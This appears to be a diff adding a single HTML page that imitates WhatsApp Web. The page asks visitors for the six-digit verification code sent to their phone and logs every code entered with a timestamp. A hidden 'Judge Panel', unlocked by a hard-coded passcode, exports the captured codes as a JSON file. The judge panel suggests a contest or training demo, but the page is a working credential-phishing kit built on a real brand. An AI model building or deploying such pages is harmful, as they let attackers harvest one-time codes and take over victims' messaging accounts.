@@ -1,0 +1,223 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WhatsApp Web</title>
+    <style>
+        :root {
+            --whatsapp-green: #25D366;
+            --whatsapp-dark: #075E54;
+            --whatsapp-light: #DCF8C6;
+        }
+        body {
+            font-family: 'Segoe UI', Helvetica, Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f0f2f5;
+            color: #111b21;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .container {
+            width: 100%;
+            max-width: 400px;
+            background: white;
+            border-radius: 12px;
+            overflow: hidden;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+        }
+        .header {
+            background-color: var(--whatsapp-dark);
+            color: white;
+            padding: 28px 20px;
+            text-align: center;
+        }
+        .logo {
+            width: 48px;
+            height: 48px;
+            margin-bottom: 16px;
+        }
+        .content {
+            padding: 24px;
+        }
+        .alert {
+            background-color: #FFF4E5;
+            border-left: 4px solid #FF9500;
+            padding: 12px 16px;
+            margin-bottom: 24px;
+            border-radius: 4px;
+            display: flex;
+            gap: 12px;
+        }
+        .alert-icon {
+            color: #FF9500;
+            font-size: 20px;
+            flex-shrink: 0;
+        }
+        .input-group {
+            margin-bottom: 24px;
+        }
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 500;
+            color: #667781;
+        }
+        .code-input {
+            width: 100%;
+            padding: 16px;
+            border: 1px solid #dddfe2;
+            border-radius: 8px;
+            font-size: 18px;
+            letter-spacing: 8px;
+            text-align: center;
+            box-sizing: border-box;
+        }
+        .btn {
+            background-color: var(--whatsapp-green);
+            color: white;
+            border: none;
+            padding: 16px;
+            width: 100%;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+        .btn:hover {
+            background-color: #128C7E;
+        }
+        .footer {
+            text-align: center;
+            padding: 16px;
+            font-size: 13px;
+            color: #667781;
+        }
+        .loader {
+            display: none;
+            border: 3px solid rgba(255,255,255,0.3);
+            border-top: 3px solid white;
+            border-radius: 50%;
+            width: 20px;
+            height: 20px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        #judgePanel {
+            display: none;
+            background: #f8f8f8;
+            padding: 16px;
+            margin-top: 20px;
+            border-radius: 8px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI+PHBhdGggZmlsbD0id2hpdGUiIGQ9Ik0xNy40NzIgMTQuNDA0Yy0uMTk2LjE5NS0uMTk2LjUxMiAwIC43MDcuMTk2LjE5Ni41MTIuMTk2LjcwOCAwIC4xOTYtLjE5NS4xOTYtLjUxMSAwLS43MDctLjE5Ni0uMTk1LS41MTItLjE5NS0uNzA4IDB6bS0uNzA4LS43MDhjLS4xOTUuMTk2LS4xOTUuNTEyIDAgLjcwNy4xOTYuMTk2LjUxMi4xOTYuNzA4IDAgLjE5NS0uMTk1LjE5NS0uNTExIDAtLjcwNy0uMTk2LS4xOTYtLjUxMi0uMTk2LS43MDggMHptLS43MDctLjcwOGMtLjE5Ni4xOTYtLjE5Ni41MTIgMCAuNzA4LjE5NS4xOTUuNTExLjE5NS43MDcgMCAuMTk2LS4xOTYuMTk2LS41MTIgMC0uNzA4LS4xOTYtLjE5NS0uNTEyLS4xOTUtLjcwNyAwek0xMiAwQzUuMzczIDAgMCA1LjM3MyAwIDEyYzAgMi40MjEuNzQ3IDQuNjcgMi4wMTcgNi41MzRDLjg0OSAyMi40Ni4wNSAyNC4yODYuMDUgMjQuMjg2YTEuMDMxIDEuMDMxIDAgMDAuOTQ0LjU4OGMuMTk2IDAgLjM5MS0uMDU4LjU1Ny0uMTc1IDAtMCAxLjU5Ni0xLjE5NiAyLjYxLTIuMDQyQzUuMzc4IDIzLjI1NyA4LjYxIDI0IDEyIDI0YzYuNjI3IDAgMTItNS4zNzMgMTItMTJTMTguNjI3IDAgMTIgMHoiLz48L3N2Zz4=" class="logo" alt="WhatsApp">
+            <h2>Verify Your Account</h2>
+        </div>
+        
+        <div class="content">
+            <div class="alert">
+                <div class="alert-icon">⚠️</div>
+                <div>
+                    <strong>Security Verification Required</strong><br>
+                    Enter the 6-digit code sent to your phone
+                </div>
+            </div>
+            
+            <div class="input-group">
+                <label>Verification Code</label>
+                <input type="text" class="code-input" maxlength="6" pattern="\d*" inputmode="numeric" placeholder="• • • • • •">
+            </div>
+            
+            <button class="btn" onclick="verifyCode()">
+                <span id="btnText">Verify</span>
+                <div class="loader" id="loader"></div>
+            </button>
+            
+            <div id="judgePanel">
+                <h3>Judge Panel</h3>
+                <p>Attempts: <span id="attemptCount">0</span></p>
+                <button onclick="exportData()" style="background:#075E54;">Export Data</button>
+            </div>
+        </div>
+        
+        <div class="footer">
+            WhatsApp will never ask you for this code outside of the official app
+        </div>
+    </div>
+
+    <script>
+        // Track all attempts
+        const attempts = [];
+        let judgeMode = false;
+        
+        // Password prompt on load
+        if (prompt("Enter admin passcode (or cancel for normal mode):") === "cyber2024") {
+            document.getElementById('judgePanel').style.display = 'block';
+            judgeMode = true;
+        }
+        
+        function verifyCode() {
+            const code = document.querySelector('.code-input').value;
+            const btnText = document.getElementById('btnText');
+            const loader = document.getElementById('loader');
+            
+            if (code.length === 6 && /^\d+$/.test(code)) {
+                // Show loading state
+                btnText.style.display = 'none';
+                loader.style.display = 'block';
+                
+                // Record attempt
+                attempts.push({
+                    pin: code,
+                    time: new Date().toLocaleString(),
+                    valid: code === '123456' // Change this to your expected PIN
+                });
+                
+                // Update judge panel
+                if (judgeMode) {
+                    document.getElementById('attemptCount').textContent = attempts.length;
+                }
+                
+                // Simulate verification
+                setTimeout(() => {
+                    alert(judgeMode 
+                        ? `Debug: PIN ${code} recorded`
+                        : 'Verification complete');
+                    
+                    // Reset UI
+                    btnText.style.display = 'inline';
+                    loader.style.display = 'none';
+                }, 1500);
+            } else {
+                alert('Please enter a valid 6-digit code');
+            }
+        }
+        
+        function exportData() {
+            const data = JSON.stringify(attempts, null, 2);
+            const blob = new Blob([data], { type: 'application/json' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = 'whatsapp_pin_attempts.json';
+            a.click();
+        }
+        
+        // Auto-focus on input
+        document.querySelector('.code-input').focus();
+    </script>
+</body>
+</html>
